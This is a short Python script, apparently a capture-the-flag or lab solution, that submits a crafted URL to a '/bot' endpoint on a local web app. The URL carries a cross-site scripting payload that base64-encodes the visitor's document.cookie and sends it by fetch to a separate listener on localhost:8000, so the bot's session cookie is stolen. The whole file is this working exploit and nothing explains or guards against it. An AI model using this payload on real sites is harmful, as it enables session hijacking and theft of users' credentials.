import requests
from urllib.parse import quote_plus

TARGET = 'http://localhost:5000'
payload = "<script>fetch('http://localhost:8000/'+btoa(document.cookie),{method: 'GET',mode: 'no-cors'}).then(x=>x.text());</script>"
if __name__ == "__main__" :
    r = requests.get(TARGET + '/bot', params={'value': TARGET + '/?value=' + quote_plus(payload)})
    print(r.request.url)